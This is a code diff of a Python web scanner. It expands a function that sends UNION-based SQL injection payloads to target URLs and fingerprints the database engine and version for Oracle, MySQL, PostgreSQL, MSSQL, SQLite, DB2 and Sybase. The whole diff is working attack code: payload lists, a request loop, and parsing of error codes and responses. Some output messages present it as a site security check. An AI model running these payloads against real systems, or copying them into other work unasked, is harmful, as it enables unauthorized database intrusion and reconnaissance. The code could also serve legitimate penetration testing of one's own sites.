@@ -108,73 +108,99 @@ def find_urls_to_test(url, base_url):
     return links
 
 def exploit_database_version(url):
-    
+    # Definimos tipos de base de datos y payloads adicionales para incrementar persistencia
     database_types = {
-    'Oracle': "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
-    'MySQL': " UNION SELECT @@version, NULL%23",
-    'PostgreSQL': "' UNION SELECT version(), NULL--",
-    'Microsoft SQL Server': "' UNION SELECT @@version, NULL--",
-    'SQLite': "' UNION SELECT sqlite_version(), NULL--",
-    'DB2': "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
-    'Sybase': "' UNION SELECT @@version, NULL--"
+        'Oracle': [
+            "' AND 1=2 UNION SELECT NULL, banner FROM v$version--",
+            "' AND 1=2 UNION SELECT NULL, version FROM v$instance--"
+        ],
+        'MySQL': [
+            " UNION SELECT @@version, NULL%23",
+            "' AND 1=2 UNION SELECT version(), NULL--"
+        ],
+        'PostgreSQL': [
+            "' UNION SELECT version(), NULL--",
+            "' AND 1=2 UNION SELECT version(), current_user--"
+        ],
+        'Microsoft SQL Server': [
+            "' UNION SELECT @@version, NULL--",
+            "' AND 1=2 UNION SELECT version(), NULL--"
+        ],
+        'SQLite': [
+            "' UNION SELECT sqlite_version(), NULL--",
+            "' AND 1=2 UNION SELECT sqlite_version(), NULL--"
+        ],
+        'DB2': [
+            "' AND 1=2 UNION SELECT NULL, service_level FROM sysibm.sysversions--",
+            "' AND 1=2 UNION SELECT version(), NULL FROM sysibm.sysversions--"
+        ],
+        'Sybase': [
+            "' UNION SELECT @@version, NULL--",
+            "' AND 1=2 UNION SELECT version(), current_user--"
+        ]
     }
 
     try:
-        for db_type, payload in database_types.items():
+        for db_type, payloads in database_types.items():
+            #print(f"[*] Attempting to detect {db_type} database...")
             
-            try:
-                response = requests.get(f"{url}{payload}")
-                response.raise_for_status()
-            except requests.exceptions.HTTPError as e:
-                
-                status_code = e.response.status_code
+            for payload in payloads:
+                try:
+                    response = requests.get(f"{url}{payload}")
+                    response.raise_for_status()
+                except requests.exceptions.HTTPError as e:
+                    status_code = e.response.status_code
 
-                if status_code == 403:
-                    print(f"[+] Congratulations, your website is secure: access to this url was blocked with a 403 (Forbidden) code.")
-                    continue
+                    if status_code == 403:
+                        print(f"[+] Congratulations, your website is secure: access to this URL was blocked with a 403 (Forbidden) code.")
+                        continue
+                    elif status_code == 500:
+                        print(f"[+] Potential vulnerability found with payload: {payload}")
+                        continue
+                    else:
+                        #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
+                        continue
 
-                elif status_code == 500:
-                    print(f"[+] Vulnerable URL found with payload: {payload}")
-                    continue
-                
-                else:
-                    #print(f"[-] An error occurred: Received HTTP {status_code} for this URL.")
-                    continue
+                if re.search(db_type, response.text, re.IGNORECASE):
+                    soup = BeautifulSoup(response.text, 'html.parser')
 
-            if re.search(db_type, response.text, re.IGNORECASE):
-                soup = BeautifulSoup(response.text, 'html.parser')
-
-                if db_type == 'Oracle':
-                    version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
-                    if version_oracle:
-                        print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
-                        return
-                elif db_type == 'MySQL' or db_type == 'Microsoft SQL Server' or db_type == 'Sybase':
-                    version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
-                    if version_generic:
-                        version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
-                        if version_number:
-                            print(f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
+                    if db_type == 'Oracle':
+                        version_oracle = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+                        if version_oracle:
+                            print(f"[+] Found the database: {db_type} | The version is: {version_oracle.strip()}")
                             return
-                elif db_type == 'PostgreSQL':
-                    version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
-                    if version_postgres:
-                        print(f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
-                        return
-                elif db_type == 'SQLite':
-                    version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
-                    if version_sqlite:
-                        print(f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
-                        return
-                elif db_type == 'DB2':
-                    version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
-                    if version_db2:
-                        print(f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
-                        return
+                    elif db_type in ['MySQL', 'Microsoft SQL Server', 'Sybase']:
+                        version_generic = soup.find(string=re.compile('.*\d{1,2}\.\d{1,2}\.\d{1,2}.*'))
+                        if version_generic:
+                            version_number = re.search(r'\d{1,2}\.\d{1,2}\.\d{1,2}[-\w\.]*', version_generic)
+                            if version_number:
+                                print(f"[+] Found the database: {db_type} | The version is: {version_number.group(0)}")
+                                return
+                    elif db_type == 'PostgreSQL':
+                        version_postgres = soup.find(string=re.compile('PostgreSQL\s[\d\.]+'))
+                        if version_postgres:
+                            print(f"[+] Found the database: {db_type} | The version is: {version_postgres.strip()}")
+                            return
+                    elif db_type == 'SQLite':
+                        version_sqlite = soup.find(string=re.compile('SQLite\s[\d\.]+'))
+                        if version_sqlite:
+                            print(f"[+] Found the database: {db_type} | The version is: {version_sqlite.strip()}")
+                            return
+                    elif db_type == 'DB2':
+                        version_db2 = soup.find(string=re.compile('DB2\s[\d\.]+'))
+                        if version_db2:
+                            print(f"[+] Found the database: {db_type} | The version is: {version_db2.strip()}")
+                            return
+
+                    print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
+            
+                else:
+                    print(f"[-] No match found for {db_type} using current payload.")
                 
-                print(f"[+] Found the database: {db_type} | [-] Could not extract the version.")
-        
-        print("[-] Could not detect the database type.")
+                # Añadir un delay para no sobrecargar el servidor
+                time.sleep(1)
+
+        print("[-] Could not detect the database type after exhausting all payloads.")
     
     except requests.exceptions.RequestException as e:
         print(f"[-] An error occurred while trying to detect the database version: {e}")
